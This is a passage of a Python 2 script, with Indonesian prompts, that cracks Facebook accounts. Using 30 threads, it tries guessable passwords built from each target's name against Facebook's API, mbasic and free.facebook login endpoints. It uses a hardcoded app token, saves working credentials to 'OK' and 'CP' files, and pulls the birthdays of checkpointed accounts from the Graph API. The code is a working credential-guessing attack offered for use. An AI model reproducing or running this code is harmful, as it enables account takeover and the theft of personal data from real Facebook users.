                    save.write('*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print'\r\x1b[0;93m  * -->' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()
    
def mbasicman():
    ua = 'ua'
    pw = 'pw'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua })
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m*--> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[0;93m  * --> ' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()
    
def freefbman():
    ua = 'ua'
    pw = 'pw'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m*--> ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('*--> ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[0;93m  * --> ' + uid + '|' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()
    
def otomatis(file):
	print("")
	print(""+p+" [ pilih metode crack - silahkan coba satu?? ]")
	print("")
	print(" [1] metode api (fast)")
	print(" [2] metode mbasic (slow)")
	print(" [3] metode free.fb (fast)")
	print("")
	z = raw_input(" [?] metode : ")
	if z == "":
		print(" [!] Pilih Yang Benar!")
		manualnjing(file)
	elif z == '01' or z == '1':
		bapi()
	elif z == '02' or z == '2':
		mbasic()
	elif z == '03' or z == '3':
		freefb()
	else:
		print(" [!] Pilih Yang Benar")
		exit()
		
def bapi():
	print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
	print("")

	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[0;97m[*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") ##Gk Usah Di Ganti Ajg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
				uas = "ua"
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': uas, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "session_key" in send.text and "EAAA" in send.text:
					print '\r  \033[0;92m*--> ' +uid+ ' | ' + pw + '        '
					ok.append(uid+' | '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  *--> '+str(uid)+' | '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()  
						sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
						b = json.loads(sw.text)
						graph = b["birthday"]
						month, day, year = graph.split("/")
						month = bulan[month]
						print'\r\x1b[0;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
						cp.append(uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
						save.write('  * --> ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
						save.close()
						break
					except(KeyError, IOError):
						graph = " "
					except:pass
					print'\r\x1b[0;93m  * --> ' + uid + '|' + pw + '                        '
					cp.append(uid + ' | ' + pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
					save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
					save.close()
					break
					continue
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] crack selesai..."
	exit()

def mbasic():
    ua = 'ua'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua })
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\\1b[0;92m [OK] ' + uid + ' | ' + pw + '                  '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + ' | ' + str(pw) + '               \n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[0;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[0;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n [+] crack selesai...'
    exit()
        
def freefb():
    uas = 'ua'
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] anda bisa menjeda proses crack dengan mematikan data seluler")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[0;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m [OK] ' + uid + ' | ' + pw + '                                            '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' [OK] ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[0;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + ' | ' + pw + ' | ' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(pw) + ' | ' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[0;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    exit()
def folder_ku():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass
	
if __name__ == '__main__':
    os.system('clear')
    folder_ku()
    print logo
    tokenz()
